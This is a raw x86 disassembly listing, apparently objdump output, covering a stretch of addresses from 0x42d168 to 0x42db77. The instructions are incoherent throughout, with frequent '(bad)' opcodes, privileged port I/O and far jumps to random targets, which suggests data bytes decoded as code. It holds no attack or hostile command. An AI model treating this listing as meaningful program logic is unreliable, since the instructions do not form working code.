  42d168:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d169:	mov    ebp,0x4113c793
  42d16e:	fidiv  DWORD PTR [eax-0x4a]
  42d171:	rol    BYTE PTR [edx],0xcf
  42d174:	fcomip st,st(5)
  42d176:	scas   eax,DWORD PTR es:[edi]
  42d177:	sti    
  42d178:	les    edi,FWORD PTR [ebx]
  42d17a:	adc    DWORD PTR [esi+0x29dd28ff],edi
  42d180:	pop    edi
  42d181:	ins    BYTE PTR es:[edi],dx
  42d182:	jbe    0x42d174
  42d184:	out    0x2c,eax
  42d186:	mov    esi,fs
  42d188:	ja     0x42d1cb
  42d18a:	in     al,0x58
  42d18c:	jecxz  0x42d167
  42d18e:	adc    bh,dh
  42d190:	push   0xffffffbd
  42d192:	ja     0x42d15b
  42d194:	mov    cl,0x7b
  42d196:	dec    ebp
  42d197:	cdq    
  42d198:	push   cs
  42d199:	jge    0x42d1c5
  42d19b:	pop    ss
  42d19c:	jl     0x42d20b
  42d19e:	sbb    BYTE PTR [ebx-0x65cb0533],0x38
  42d1a5:	popf   
  42d1a6:	jmp    eax
  42d1a8:	repnz cmc 
  42d1aa:	enter  0x5d44,0xf9
  42d1ae:	or     BYTE PTR [eax+0x4a689de7],al
  42d1b4:	mov    ebp,DWORD PTR [ebp-0x1d]
  42d1b7:	mov    bl,0x31
  42d1b9:	mov    ebx,0xe19cc5fd
  42d1be:	sbb    al,0xf2
  42d1c0:	test   eax,0x405ab401
  42d1c5:	bnd je 0x42d20d
  42d1c8:	lds    esp,FWORD PTR [ecx]
  42d1ca:	gs int 0xff
  42d1cd:	(bad)  
  42d1ce:	(bad)  
  42d1cf:	mov    eax,ds:0x58da4b9
  42d1d4:	arpl   WORD PTR ds:[eax],si
  42d1d7:	call   0xfa97:0x34920982
  42d1de:	shl    esi,0x51
  42d1e1:	cwde   
  42d1e2:	mov    eax,0xe5a03650
  42d1e7:	mov    al,0x9c
  42d1e9:	out    0x31,al
  42d1eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d1ec:	mov    ds:0x4fbb44c0,al
  42d1f1:	loopne 0x42d1f9
  42d1f3:	mov    esi,0x79d7c003
  42d1f8:	pop    eax
  42d1f9:	xlat   BYTE PTR ds:[ebx]
  42d1fa:	mov    ah,0x78
  42d1fc:	adc    ebp,DWORD PTR [ebp+0x1]
  42d1ff:	lods   al,BYTE PTR ds:[esi]
  42d200:	dec    esi
  42d201:	jle    0x42d1b6
  42d203:	test   al,0xfc
  42d205:	jecxz  0x42d1f1
  42d207:	add    eax,DWORD PTR [edx]
  42d209:	retf   
  42d20a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d20b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d20c:	cwde   
  42d20d:	jle    0x42d192
  42d20f:	(bad)  
  42d210:	sbb    al,BYTE PTR [eax]
	...
  42d272:	add    BYTE PTR [eax],al
  42d274:	lea    ecx,[eax]
  42d276:	pop    ebp
  42d277:	jbe    0x42d256
  42d279:	ja     0x42d22a
  42d27b:	sti    
  42d27c:	aaa    
  42d27d:	out    0x36,eax
  42d27f:	ja     0x42d22a
  42d281:	pusha  
  42d282:	cli    
  42d283:	stc    
  42d284:	sbb    eax,0x50001e4
  42d289:	add    DWORD PTR [eax],eax
  42d28b:	add    al,al
  42d28d:	stos   DWORD PTR es:[edi],eax
  42d28e:	mov    bl,0x74
  42d291:	cwde   
  42d292:	out    0x41,al
  42d294:	shl    BYTE PTR [edi+0x14],cl
  42d297:	add    eax,0x783227f9
  42d29c:	retf   
  42d29d:	fdivr  DWORD PTR ds:0xc9f7c09a
  42d2a3:	cdq    
  42d2a4:	sub    al,bh
  42d2a6:	call   0x9be4:0x505ed6fd
  42d2ad:	aam    0x7b
  42d2af:	arpl   WORD PTR [ecx+0x67],di
  42d2b2:	lea    ecx,[edi]
  42d2b4:	int3   
  42d2b5:	jns    0x42d297
  42d2b7:	and    cl,BYTE PTR [esp+ecx*4+0x44]
  42d2bb:	mov    ah,BYTE PTR [esp+ecx*4-0x7aa21f2a]
  42d2c2:	mov    ds:0x9ab80c82,al
  42d2c7:	rol    BYTE PTR [ecx+0x742f2c8e],cl
  42d2cd:	push   ebp
  42d2ce:	call   0xeb207aa0
  42d2d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d2d4:	pop    edi
  42d2d5:	push   eax
  42d2d6:	sbb    ebx,esi
  42d2d8:	mov    ebx,0xd3cb27cc
  42d2dd:	jns    0x42d27c
  42d2df:	xor    BYTE PTR [bx],ch
  42d2e2:	add    eax,0x41799f11
  42d2e7:	lahf   
  42d2e8:	in     al,0x95
  42d2ea:	fist   DWORD PTR [edi-0x7f1db7a9]
  42d2f0:	mov    ch,0x45
  42d2f2:	std    
  42d2f3:	dec    ebx
  42d2f4:	jns    0x42d284
  42d2f6:	mov    ecx,0x24d02774
  42d2fb:	pop    ebx
  42d2fc:	bound  esp,QWORD PTR [edi+0x3c]
  42d2ff:	mov    BYTE PTR [ebx],ch
  42d301:	add    eax,0xe8716c67
  42d306:	sti    
  42d307:	add    ah,BYTE PTR [esi+0x4d84ea42]
  42d30d:	iret   
  42d30e:	data16 (bad) 
  42d310:	jge    0x42d30a
  42d312:	xor    al,0xbe
  42d314:	cmp    BYTE PTR [esi+0x19d087e2],0x40
  42d31b:	mov    WORD PTR [ebx],ds
  42d31d:	cmp    eax,0x72b6446d
  42d322:	pop    edi
  42d323:	icebp  
  42d324:	cmp    BYTE PTR [ecx-0x1f4117d3],0x3c
  42d32b:	xor    eax,0x82ed085d
  42d330:	mov    ecx,0x378d840a
  42d335:	push   ecx
  42d336:	jno    0x42d392
  42d338:	or     ah,bl
  42d33a:	xor    ebx,DWORD PTR [esi-0x3f3625cf]
  42d340:	xchg   ebp,eax
  42d341:	add    DWORD PTR [esp+edx*2],0xbabf1a7c
  42d348:	ret    0xb69b
  42d34b:	sar    DWORD PTR [esi+0x75],0x4e
  42d34f:	(bad)  
  42d350:	pop    esp
  42d351:	sub    al,0x67
  42d353:	mov    ah,0xe3
  42d355:	jno    0x42d323
  42d357:	iret   
  42d358:	dec    edi
  42d359:	jno    0x42d3c0
  42d35b:	adc    DWORD PTR [ebp+0x2f],0x7982aadc
  42d362:	adc    al,0xc3
  42d364:	mov    cl,BYTE PTR [ebx-0x57]
  42d367:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d368:	jae    0x42d3e3
  42d36a:	xchg   esp,eax
  42d36b:	jmp    0xb264:0xe27c5ef
  42d372:	or     ebp,ecx
  42d374:	pop    ecx
  42d375:	ret    
  42d376:	out    dx,al
  42d377:	jle    0x42d3c8
  42d379:	jecxz  0x42d3bb
  42d37b:	inc    ebp
  42d37c:	dec    edx
  42d37d:	imul   esp,DWORD PTR [eax-0x23f44f37],0xffffff91
  42d384:	call   0xab99ddf5
  42d389:	pusha  
  42d38a:	push   es
  42d38b:	dec    esi
  42d38c:	pop    ebx
  42d38d:	pop    ecx
  42d38e:	mov    bh,0xc3
  42d390:	loope  0x42d392
	...
  42d3f2:	add    BYTE PTR [eax],al
  42d3f4:	ror    esi,0x63
  42d3f7:	cdq    
  42d3f8:	outs   dx,DWORD PTR ds:[esi]
  42d3f9:	mov    ebp,0x9459defb
  42d3fe:	aaa    
  42d3ff:	pushf  
  42d400:	sbb    edx,DWORD PTR [edi+0x24]
  42d403:	addr16 and ah,ch
  42d406:	add    DWORD PTR [eax],eax
  42d408:	add    eax,0x4b000001
  42d40d:	jmp    0x8a91:0xf503
  42d413:	push   cs
  42d414:	xchg   esp,eax
  42d415:	jne    0x42d47f
  42d417:	das    
  42d418:	cmp    DWORD PTR [ebp-0x1b038fa3],edi
  42d41e:	arpl   di,sp
  42d420:	xor    ebx,esp
  42d422:	imul   esp,DWORD PTR [ecx+0x62],0xdc226a26
  42d429:	jbe    0x42d40f
  42d42b:	(bad)  
  42d42c:	pop    ss
  42d42d:	mov    esp,0xbee5784e
  42d432:	cmp    BYTE PTR [edx+0xf05611],bl
  42d438:	das    
  42d439:	scas   eax,DWORD PTR es:[edi]
  42d43a:	int    0xd9
  42d43c:	retf   
  42d43d:	pop    es
  42d43e:	scas   al,BYTE PTR es:[edi]
  42d43f:	push   esp
  42d440:	cdq    
  42d441:	call   0x466d:0x9a0ddada
  42d448:	jo     0x42d47b
  42d44a:	ds gs mov ecx,0xefe459be
  42d451:	xchg   DWORD PTR ds:0xc8464664,ebx
  42d457:	cmp    dh,BYTE PTR [edi]
  42d459:	sub    edx,ebp
  42d45b:	inc    esp
  42d45c:	iret   
  42d45d:	mov    ?,WORD PTR [ecx]
  42d45f:	xchg   ebp,eax
  42d460:	inc    edx
  42d461:	movs   DWORD PTR es:[di],DWORD PTR es:[si]
  42d464:	cmp    BYTE PTR [ecx],cl
  42d466:	jge    0x42d41e
  42d468:	adc    DWORD PTR [edx-0x20],esi
  42d46b:	in     eax,dx
  42d46c:	aaa    
  42d46d:	cli    
  42d46e:	jmp    0x42d493
  42d470:	mov    ds:0xba49f8dd,eax
  42d475:	pushf  
  42d476:	or     al,0x47
  42d478:	cmp    DWORD PTR [eax],esi
  42d47a:	push   esi
  42d47b:	jbe    0x42d4d7
  42d47d:	sti    
  42d47e:	aam    0x42
  42d480:	sbb    esp,DWORD PTR [ecx]
  42d482:	sbb    esp,DWORD PTR [ebp-0x1f]
  42d485:	mov    ecx,0x74598a5e
  42d48a:	mov    WORD PTR [ebp-0x29],gs
  42d48d:	pop    ss
  42d48e:	mov    ds:0xc2c1ace7,al
  42d493:	pop    esp
  42d494:	pop    ebx
  42d495:	test   eax,0x726ac2b4
  42d49a:	fwait
  42d49b:	push   es
  42d49c:	fldenv [edx]
  42d49e:	inc    esi
  42d49f:	xor    eax,0xcf311018
  42d4a4:	jl     0x42d466
  42d4a6:	out    dx,al
  42d4a7:	mov    ebx,0xeb51b6a2
  42d4ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d4ad:	outs   dx,DWORD PTR ds:[esi]
  42d4ae:	mov    ds:0xd4e181c7,al
  42d4b3:	div    BYTE PTR [eax-0x23]
  42d4b6:	(bad)  
  42d4b7:	mov    dl,0x6e
  42d4b9:	sbb    edi,DWORD PTR [ebx]
  42d4bb:	out    0xc6,eax
  42d4bd:	adc    edi,edx
  42d4bf:	xchg   ebx,eax
  42d4c0:	ficomp WORD PTR [edx]
  42d4c2:	aad    0x9d
  42d4c4:	fcom   DWORD PTR [ecx+0x3e6ca053]
  42d4ca:	push   es
  42d4cb:	and    BYTE PTR [eax],bh
  42d4cd:	retf   0x4525
  42d4d0:	pop    ss
  42d4d1:	push   cs
  42d4d2:	cdq    
  42d4d3:	sti    
  42d4d4:	adc    eax,0xbaf3cfda
  42d4d9:	daa    
  42d4da:	add    cl,BYTE PTR [ebx+eax*1]
  42d4dd:	push   0x63
  42d4df:	dec    esi
  42d4e0:	adc    BYTE PTR [ecx-0x7b],ch
  42d4e3:	sbb    cl,ah
  42d4e5:	popa   
  42d4e6:	pop    ebp
  42d4e7:	mov    eax,ds:0xd46eb02a
  42d4ec:	jns    0x42d4f7
  42d4ee:	jnp    0x42d53d
  42d4f0:	retf   
  42d4f1:	sti    
  42d4f2:	jmp    0x42d49c
  42d4f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d4f5:	pop    ds
  42d4f6:	or     esp,DWORD PTR [ebp-0x1c]
  42d4f9:	(bad)  
  42d4fa:	xor    ebx,esp
  42d4fc:	xor    DWORD PTR [ebx+0x2cad5a2e],edx
  42d502:	imul   ebp,DWORD PTR ds:[ebx-0x2],0x5a2e6dfc
  42d50a:	dec    eax
  42d50b:	xchg   esi,eax
  42d50c:	fisttp WORD PTR [edx*1+0xdfb1]
	...
  42d573:	add    BYTE PTR [ecx-0x11ac7d0b],bl
  42d579:	ja     0x42d554
  42d57b:	call   FWORD PTR [ebp+0x3e]
  42d57e:	mov    ds:0xff5bd6d5,eax
  42d583:	in     eax,dx
  42d584:	daa    
  42d585:	out    0x1,al
  42d587:	add    BYTE PTR ds:0xc5000001,al
  42d58d:	xor    eax,0x37b33cd3
  42d592:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d593:	inc    ebp
  42d594:	neg    DWORD PTR [ecx]
  42d596:	cmp    eax,0x7ccf4304
  42d59b:	sar    BYTE PTR [ebx-0x6ea23351],1
  42d5a1:	sahf   
  42d5a2:	mov    cl,0x10
  42d5a4:	xchg   DWORD PTR [ecx],edx
  42d5a6:	sti    
  42d5a7:	in     eax,0x34
  42d5a9:	xchg   esi,eax
  42d5aa:	sar    dl,cl
  42d5ac:	call   0xaef97542
  42d5b1:	sar    DWORD PTR [edi+0x7260a5b3],cl
  42d5b7:	lods   eax,DWORD PTR ds:[esi]
  42d5b8:	mov    cl,0x77
  42d5ba:	cmp    al,0xba
  42d5bc:	xlat   BYTE PTR ds:[ebx]
  42d5be:	or     edi,DWORD PTR [bx]
  42d5c1:	push   cx
  42d5c3:	and    edx,DWORD PTR [esi+0x9]
  42d5c6:	sahf   
  42d5c7:	push   eax
  42d5c8:	dec    eax
  42d5c9:	push   ss
  42d5ca:	jae    0x42d628
  42d5cc:	add    eax,0x3da74db1
  42d5d1:	loope  0x42d581
  42d5d3:	xor    bh,BYTE PTR [edx+ebx*8+0x1a]
  42d5d7:	or     dh,0x6d
  42d5da:	xlat   BYTE PTR ds:[ebx]
  42d5db:	(bad)  
  42d5dc:	mov    DWORD PTR [esi],eax
  42d5de:	icebp  
  42d5df:	ins    BYTE PTR es:[di],dx
  42d5e1:	aad    0x6b
  42d5e3:	in     eax,0x66
  42d5e5:	add    DWORD PTR [ebx-0xf63f6bd],esp
  42d5eb:	stos   DWORD PTR es:[edi],eax
  42d5ec:	xor    ecx,edx
  42d5ee:	dec    ecx
  42d5ef:	push   ebp
  42d5f0:	ins    DWORD PTR es:[edi],dx
  42d5f1:	add    BYTE PTR [edx+0x30],dh
  42d5f4:	out    dx,al
  42d5f5:	and    al,0xbc
  42d5f7:	lahf   
  42d5f8:	sub    BYTE PTR [ebx+0x75],ah
  42d5fb:	dec    eax
  42d5fc:	lahf   
  42d5fd:	in     eax,dx
  42d5fe:	pop    eax
  42d5ff:	daa    
  42d600:	shr    BYTE PTR [esi+0x78],0x8
  42d604:	push   es
  42d605:	mov    bh,0x3d
  42d607:	hlt    
  42d608:	sbb    al,dh
  42d60a:	mov    edx,0x49b44f92
  42d60f:	cli    
  42d610:	and    eax,0xff07a2e2
  42d615:	mov    al,ds:0xd762bb6e
  42d61a:	push   ecx
  42d61b:	mov    ah,0xb
  42d61d:	mov    eax,ds:0x61bc2c59
  42d622:	das    
  42d623:	dec    ebx
  42d624:	dec    ebp
  42d625:	sbb    DWORD PTR [ebp+0x13],edx
  42d628:	xlat   BYTE PTR ds:[ebx]
  42d629:	in     al,0x3e
  42d62b:	jo     0x42d678
  42d62d:	xchg   BYTE PTR [edi],ch
  42d62f:	jmp    0x42d693
  42d631:	adc    BYTE PTR [ecx-0x7a],dh
  42d634:	scas   al,BYTE PTR es:[edi]
  42d635:	mov    bh,0xfe
  42d637:	daa    
  42d638:	mov    al,0xb3
  42d63a:	or     eax,0x1a45da1a
  42d63f:	jae    0x42d660
  42d641:	xchg   ebp,eax
  42d642:	pop    esi
  42d643:	inc    ebx
  42d644:	pop    edi
  42d645:	fistp  WORD PTR [edi]
  42d647:	cs and dh,dh
  42d64a:	int3   
  42d64b:	popa   
  42d64c:	popf   
  42d64d:	add    dh,BYTE PTR [ebx+0x1c]
  42d650:	ds enter 0x21d2,0x6f
  42d655:	xor    DWORD PTR [edx-0x3ee4d03d],edi
  42d65b:	fs or  al,0x73
  42d65e:	add    BYTE PTR [edx-0x1bd726c7],ch
  42d664:	or     eax,0x396e472
  42d669:	and    BYTE PTR [esi],dl
  42d66b:	mov    edi,edi
  42d66d:	mov    cl,0x26
  42d66f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d670:	fs fwait
  42d672:	stos   BYTE PTR es:[edi],al
  42d673:	sbb    ecx,DWORD PTR [edi+0x65b2d56]
  42d679:	xlat   BYTE PTR ds:[ebx]
  42d67a:	push   ebp
  42d67b:	mov    WORD PTR [edi],gs
  42d67d:	sbb    dl,bh
  42d67f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d680:	dec    esi
  42d681:	dec    esi
  42d682:	ds pusha 
  42d684:	mov    esp,0xf6b3af88
  42d689:	adc    al,0xf7
  42d68b:	out    0x10,eax
  42d68d:	cld    
  42d68e:	add    ecx,ebp
  42d690:	pop    ebp
	...
  42d6f1:	add    BYTE PTR [eax],al
  42d6f3:	add    bl,dh
  42d6f5:	add    esp,DWORD PTR [eax]
  42d6f7:	(bad)  
  42d6f8:	lock scas eax,DWORD PTR es:[edi]
  42d6fa:	(bad)  
  42d6fb:	jg     0x42d67e
  42d6fd:	in     al,0x2c
  42d6ff:	and    al,0x7d
  42d701:	daa    
  42d702:	mov    ds:0x1e72cf3,al
  42d707:	add    BYTE PTR ds:0xbe000001,al
  42d70d:	cdq    
  42d70e:	dec    esi
  42d70f:	add    esi,DWORD PTR [esp+esi*8-0x3bc9b579]
  42d716:	jl     0x42d78a
  42d718:	adc    eax,0xa98fe895
  42d71d:	xchg   esi,eax
  42d71e:	pop    es
  42d71f:	(bad)  
  42d720:	jmp    0x42cd:0xc748831a
  42d727:	jae    0x42d778
  42d729:	pop    ebx
  42d72a:	xor    BYTE PTR [edi-0x59edb954],bl
  42d730:	adc    al,0xa6
  42d732:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d733:	sar    BYTE PTR [di-0x4e],cl
  42d737:	pop    es
  42d738:	cmp    eax,0xdc41eb07
  42d73d:	lea    esi,[ebx-0x33]
  42d740:	and    eax,0x854112c4
  42d745:	mov    edi,ebp
  42d747:	(bad)  
  42d748:	jmp    0x42d7b4
  42d74a:	les    ecx,FWORD PTR ds:0x4d2bb3af
  42d750:	push   ss
  42d751:	call   0xaa72ac7
  42d756:	mov    ?,WORD PTR [eax+0x2b3ee26d]
  42d75c:	push   edx
  42d75d:	adc    ch,BYTE PTR [esi]
  42d75f:	jg     0x42d7c3
  42d761:	dec    esi
  42d762:	jno    0x42d7b9
  42d764:	xchg   edi,eax
  42d765:	add    DWORD PTR [edi],0xe6558f9b
  42d76b:	xchg   edx,eax
  42d76c:	xor    al,0x18
  42d76e:	daa    
  42d76f:	dec    edx
  42d770:	test   bl,al
  42d772:	push   es
  42d773:	in     al,0x6c
  42d775:	pop    ds
  42d776:	in     eax,dx
  42d777:	int3   
  42d778:	xchg   ecx,eax
  42d779:	adc    BYTE PTR [ebx+ecx*8+0x15],al
  42d77d:	xchg   edi,eax
  42d77e:	inc    eax
  42d77f:	push   ebx
  42d780:	cmp    bh,BYTE PTR [edx]
  42d782:	pop    ecx
  42d783:	ds idiv esp
  42d786:	pop    edi
  42d787:	sub    dh,BYTE PTR [esi+0x6c832596]
  42d78d:	pop    esi
  42d78e:	sub    al,0x1c
  42d790:	arpl   si,cx
  42d792:	sbb    al,0xb8
  42d794:	sub    DWORD PTR [ebx-0x69],edx
  42d797:	sbb    DWORD PTR [ebx-0x38],0xffffffcb
  42d79b:	call   0x7928:0xb7d7d142
  42d7a2:	mov    ds:0x5eb5f38f,al
  42d7a7:	and    BYTE PTR [edx+0x9],ah
  42d7aa:	es cdq 
  42d7ac:	sbb    eax,0xf57063b5
  42d7b1:	mov    WORD PTR [edx-0x30],cs
  42d7b4:	(bad)  
  42d7b5:	xchg   ebp,eax
  42d7b6:	mov    eax,0x5292ae27
  42d7bb:	mov    ecx,0x8700257f
  42d7c0:	js     0x42d7cb
  42d7c2:	cli    
  42d7c3:	mov    ah,0xf4
  42d7c5:	fmul   QWORD PTR [ebp+0x53]
  42d7c8:	rol    ebx,cl
  42d7ca:	sbb    edx,DWORD PTR es:[eax-0xf]
  42d7ce:	imul   eax,DWORD PTR [ebx],0xfffffff6
  42d7d1:	cmp    eax,0x59e28343
  42d7d6:	in     al,dx
  42d7d7:	test   DWORD PTR [eax+0x6d5b5150],0x8e93213c
  42d7e1:	pop    esp
  42d7e2:	xchg   esi,eax
  42d7e3:	xor    BYTE PTR [ebp+0x4b],bh
  42d7e6:	jb     0x42d84f
  42d7e8:	sti    
  42d7e9:	aaa    
  42d7ea:	enter  0xe47e,0xa1
  42d7ee:	mov    edx,0x2060d159
  42d7f3:	sbb    al,0x74
  42d7f5:	retf   
  42d7f6:	pop    ecx
  42d7f7:	mov    al,ds:0xc4fa9cad
  42d7fc:	dec    edi
  42d7fd:	mov    ch,0xe3
  42d7ff:	std    
  42d800:	pop    ecx
  42d801:	fadd   st,st(7)
  42d803:	popa   
  42d804:	pop    esp
  42d805:	imul   esp,DWORD PTR [ecx-0x64],0xffffffa8
  42d809:	mov    ebp,0x8ca9ddca
  42d80e:	hlt    
  42d80f:	or     eax,DWORD PTR ds:0x0
	...
  42d871:	add    BYTE PTR [eax],al
  42d873:	add    BYTE PTR [esi-0x62a06765],dl
  42d879:	pop    edi
  42d87a:	xlat   BYTE PTR ds:[ebx]
  42d87b:	fistp  DWORD PTR ds:0x5dc6961a
  42d881:	out    dx,eax
  42d882:	dec    ebx
  42d883:	enter  0xe831,0x1
  42d887:	add    BYTE PTR ds:0xd8000001,al
  42d88d:	add    DWORD PTR [ebx],0xe7bf71
  42d893:	lods   al,BYTE PTR ds:[esi]
  42d894:	xchg   edx,ebx
  42d896:	mov    ebp,0x451c32e7
  42d89b:	call   0x908814da
  42d8a0:	dec    ecx
  42d8a1:	xor    al,0x23
  42d8a4:	push   edx
  42d8a5:	or     al,BYTE PTR [edx-0x415eabf7]
  42d8ab:	ss aaa 
  42d8ad:	sub    DWORD PTR [ecx-0x558b7bba],edx
  42d8b3:	inc    eax
  42d8b4:	data16 and dl,bh
  42d8b7:	mov    ecx,0x482cd0dd
  42d8bc:	inc    edx
  42d8bd:	pop    edx
  42d8be:	retf   0x6d0c
  42d8c1:	fsubr  st,st(0)
  42d8c3:	imul   esi,DWORD PTR [edx+0xd],0x659181cb
  42d8ca:	test   eax,0xbfba247e
  42d8cf:	xchg   esi,eax
  42d8d0:	push   edi
  42d8d1:	test   ah,al
  42d8d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d8d4:	test   eax,0x8885aa5c
  42d8d9:	fstp   st(0)
  42d8db:	mov    al,ds:0x961569bb
  42d8e0:	loopne 0x42d931
  42d8e2:	dec    edi
  42d8e3:	fnstenvw es:[ebx-0x6b]
  42d8e8:	rcr    DWORD PTR [ecx-0x26],cl
  42d8eb:	fstp   TBYTE PTR [edi]
  42d8ed:	int    0x1a
  42d8ef:	adc    esp,edi
  42d8f1:	outs   dx,DWORD PTR ds:[esi]
  42d8f2:	std    
  42d8f3:	jmp    0xb71ce93f
  42d8f8:	adc    cl,BYTE PTR [edx-0x3d]
  42d8fb:	xor    BYTE PTR [edx-0x1fe69ea0],ah
  42d901:	test   DWORD PTR [ebx],0xbf72b28a
  42d907:	xchg   ecx,eax
  42d908:	scas   al,BYTE PTR es:[edi]
  42d909:	imul   edx,DWORD PTR [edi+0x2d],0xb0cb812b
  42d910:	(bad)  
  42d911:	pusha  
  42d912:	add    BYTE PTR [ecx-0x74],0xd0
  42d916:	rol    DWORD PTR [eax],0x5c
  42d919:	pop    ebx
  42d91a:	(bad)  
  42d91c:	daa    
  42d91d:	xchg   ebx,eax
  42d91e:	mov    bh,0x23
  42d920:	jne    0x42d926
  42d922:	call   0x4c10e72c
  42d927:	pop    esp
  42d928:	mov    esi,0xfd112c3a
  42d92d:	add    BYTE PTR [eax],bh
  42d92f:	mov    ah,BYTE PTR [edx-0x55]
  42d932:	call   0xfb92ea47
  42d937:	setp   BYTE PTR [esi]
  42d93a:	in     eax,dx
  42d93b:	(bad)  
  42d93c:	cs pop esi
  42d93e:	scas   al,BYTE PTR es:[edi]
  42d93f:	aam    0x1d
  42d941:	ficom  WORD PTR [edi-0x41ca5b1]
  42d947:	mov    ebx,esi
  42d949:	fs pop ds
  42d94b:	push   es
  42d94c:	mov    ebp,0xb6285ca6
  42d951:	stos   DWORD PTR es:[edi],eax
  42d952:	fisttp DWORD PTR [edx]
  42d954:	ret    
  42d955:	mov    eax,ds:0xc8e4555b
  42d95a:	inc    edi
  42d95b:	and    DWORD PTR [edx],ebx
  42d95d:	jle    0x42d952
  42d95f:	out    0xeb,al
  42d961:	inc    esi
  42d962:	inc    eax
  42d963:	jae    0x42d9d4
  42d965:	repz push esp
  42d967:	xor    al,0x3c
  42d969:	jmp    0xcd8c:0xfe89206a
  42d970:	jmp    0xd5604eb
  42d975:	call   0xff04:0x2b73a973
  42d97c:	jmp    0x4cda:0xbf205efb
  42d983:	les    esi,FWORD PTR [eax-0x29]
  42d986:	ficomp WORD PTR [ebx+0x20]
  42d989:	in     al,dx
  42d98a:	sub    eax,0xb4e77053
  42d98f:	jb     0x42d96d
	...
  42d9f1:	add    BYTE PTR [eax],al
  42d9f3:	add    cl,bh
  42d9f5:	mov    cl,0x70
  42d9f7:	dec    eax
  42d9f8:	js     0x42d9c3
  42d9fa:	stc    
  42d9fb:	mov    cl,0xbf
  42d9fd:	dec    edi
  42d9fe:	int    0xe1
  42da00:	cli    
  42da01:	push   esi
  42da02:	shr    dl,cl
  42da04:	ss jmp 0x147da0b
  42da0a:	add    BYTE PTR [eax],al
  42da0c:	push   esp
  42da0d:	dec    edi
  42da0e:	xchg   ecx,eax
  42da0f:	dec    edx
  42da10:	ror    esi,0xad
  42da13:	sbb    DWORD PTR [ecx-0x9],edi
  42da16:	push   edi
  42da17:	enter  0x5a20,0xb8
  42da1b:	aas    
  42da1c:	xor    BYTE PTR [edx-0x26cd177c],cl
  42da22:	cdq    
  42da23:	inc    ebx
  42da24:	(bad)  
  42da25:	lods   al,BYTE PTR ds:[esi]
  42da26:	sub    esi,DWORD PTR [eax]
  42da28:	addr16 sbb esp,eax
  42da2b:	sbb    al,0xa2
  42da2d:	mov    esp,0xb6a4d2a8
  42da32:	lahf   
  42da33:	int3   
  42da34:	dec    esi
  42da35:	loopne 0x42da38
  42da37:	dec    esi
  42da38:	push   0x561ca93b
  42da3d:	out    dx,al
  42da3e:	aad    0x50
  42da40:	fild   WORD PTR [ecx-0x458c2404]
  42da46:	dec    ecx
  42da47:	pop    es
  42da48:	and    edx,DWORD PTR [edi-0x657ed2b5]
  42da4e:	daa    
  42da4f:	sub    al,0xd3
  42da51:	mov    esp,fs
  42da53:	push   ebx
  42da54:	xchg   esp,eax
  42da55:	hlt    
  42da56:	adc    ax,0xfda6
  42da5a:	stos   DWORD PTR es:[edi],eax
  42da5b:	pop    esp
  42da5c:	cwde   
  42da5d:	sbb    eax,0x47c69a29
  42da62:	cmp    esp,esp
  42da64:	cld    
  42da65:	mov    ds:0xfb7bb613,eax
  42da6a:	inc    esi
  42da6b:	lea    edx,[edi-0x7e046df]
  42da71:	bound  esp,QWORD PTR [eax]
  42da73:	mov    bh,0x6
  42da75:	push   ebp
  42da76:	iret   
  42da77:	mov    edi,fs
  42da79:	pop    ds
  42da7a:	push   es
  42da7b:	mov    al,BYTE PTR [edx-0x1f782106]
  42da81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42da82:	xchg   ebp,eax
  42da83:	gs dec edi
  42da85:	shl    BYTE PTR [ecx+0x43],0xb2
  42da89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42da8a:	lods   al,BYTE PTR ds:[esi]
  42da8b:	jbe    0x42da19
  42da8d:	dec    esi
  42da8e:	test   DWORD PTR [edi],ecx
  42da90:	ins    DWORD PTR es:[edi],dx
  42da91:	in     al,dx
  42da92:	iret   
  42da93:	test   eax,0x1bce54ea
  42da98:	pop    ds
  42da99:	add    eax,0x766c30f1
  42da9e:	add    ecx,DWORD PTR ds:0xa5f6f02e
  42daa4:	fmul   DWORD PTR [esp+esi*2]
  42daa7:	pop    edx
  42daa8:	mov    ebp,0x939cf7cd
  42daad:	mov    dh,0xb0
  42daaf:	mov    al,ds:0x570109d9
  42dab4:	jg     0x42da5a
  42dab6:	mov    ss,ebx
  42dab8:	pop    ss
  42dab9:	outs   dx,BYTE PTR ds:[esi]
  42dabb:	pushf  
  42dabc:	shr    BYTE PTR [ecx],0x5d
  42dabf:	push   edx
  42dac0:	arpl   WORD PTR [esi-0x26],bp
  42dac3:	(bad)  
  42dac4:	rol    bh,cl
  42dac6:	push   esp
  42dac7:	mov    cl,al
  42dac9:	retf   0xa260
  42dacc:	jne    0x42db37
  42dace:	arpl   ax,bx
  42dad0:	mov    edi,0xd73d4986
  42dad5:	jmp    0x376:0x88b10448
  42dadc:	inc    ecx
  42dadd:	inc    ebx
  42dade:	test   eax,0xc532caf2
  42dae3:	inc    esp
  42dae4:	loop   0x42da73
  42dae6:	jmp    ecx
  42dae8:	lea    ebp,[eax-0x6a]
  42daeb:	push   edi
  42daec:	mov    esp,0xe5214c
  42daf1:	jbe    0x42dac3
  42daf3:	ror    DWORD PTR [edx-0x5cd4ecc7],0xb1
  42dafa:	push   eax
  42dafb:	mov    fs:0xb0507cb8,al
  42db01:	ss sahf 
  42db03:	out    0x92,al
  42db05:	into   
  42db06:	jp     0x42db20
  42db08:	jp     0x42db51
  42db0a:	xchg   ecx,eax
  42db0b:	scas   al,BYTE PTR es:[edi]
  42db0c:	jbe    0x42dada
  42db0e:	dec    ebp
  42db0f:	leave  
  42db10:	sbb    BYTE PTR [eax],al
	...
  42db72:	add    BYTE PTR [eax],al
  42db74:	mov    al,0x7a
  42db76:	pop    ds
  42db77:	ins    BYTE PTR es:[edi],dx
